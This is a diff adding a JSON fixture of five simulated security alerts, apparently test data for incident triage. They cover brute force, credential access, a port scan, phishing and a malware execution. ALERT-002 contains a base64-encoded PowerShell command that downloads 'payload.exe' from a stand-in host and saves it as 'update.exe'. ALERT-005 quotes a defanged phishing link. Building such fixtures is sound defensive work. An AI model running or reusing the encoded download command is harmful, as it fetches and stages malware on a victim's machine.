@@ -1,0 +1,42 @@
+[
+  {
+    "id": "ALERT-001",
+    "source": "Splunk SIEM",
+    "timestamp": "2026-06-17T06:00:00Z",
+    "raw": "Multiple failed SSH login attempts from IP 203.0.113.45 targeting prod-db-01. 847 attempts in 3 minutes. Source IP flagged by threat intel (Shodan: known scanner). Last successful login from this IP: never.",
+    "host": "prod-db-01",
+    "type": "brute_force"
+  },
+  {
+    "id": "ALERT-002",
+    "source": "CrowdStrike EDR",
+    "timestamp": "2026-06-17T06:05:00Z",
+    "raw": "Suspicious PowerShell execution on DESKTOP-HR-042. Command: powershell.exe -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AZQBuAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACcALAAnAEMAOgBcAFQAZQBtAHAAXAB1AHAAZABhAHQAZQAuAGUAeABlACcAKQA=. User: jsmith. Process parent: winword.exe",
+    "host": "DESKTOP-HR-042",
+    "type": "malware_execution"
+  },
+  {
+    "id": "ALERT-003",
+    "source": "AWS GuardDuty",
+    "timestamp": "2026-06-17T06:10:00Z",
+    "raw": "Unusual API call: GetSecretValue called 156 times in 2 minutes from Lambda function arn:aws:lambda:ap-southeast-2:123456789:function:report-generator. Normal baseline: 2-3 calls/hour. No code deployment in last 7 days.",
+    "host": "AWS Lambda: report-generator",
+    "type": "credential_access"
+  },
+  {
+    "id": "ALERT-004",
+    "source": "Firewall",
+    "timestamp": "2026-06-17T06:15:00Z",
+    "raw": "Port scan detected from internal IP 10.0.5.22 (workstation assigned to contractor account). Scanning subnet 10.0.1.0/24, ports 22,3389,1433,3306. Duration: 8 minutes.",
+    "host": "10.0.5.22",
+    "type": "reconnaissance"
+  },
+  {
+    "id": "ALERT-005",
+    "source": "Email Gateway",
+    "timestamp": "2026-06-17T06:20:00Z",
+    "raw": "Phishing email blocked. Sender: accounts@paypa1.com. Subject: 'Urgent: Account Verification Required'. 3 recipients in Finance dept attempted to click link. Link: hxxp://paypa1-verify.xyz/login. No successful payload delivery.",
+    "host": "Email Gateway",
+    "type": "phishing_attempt"
+  }
+]
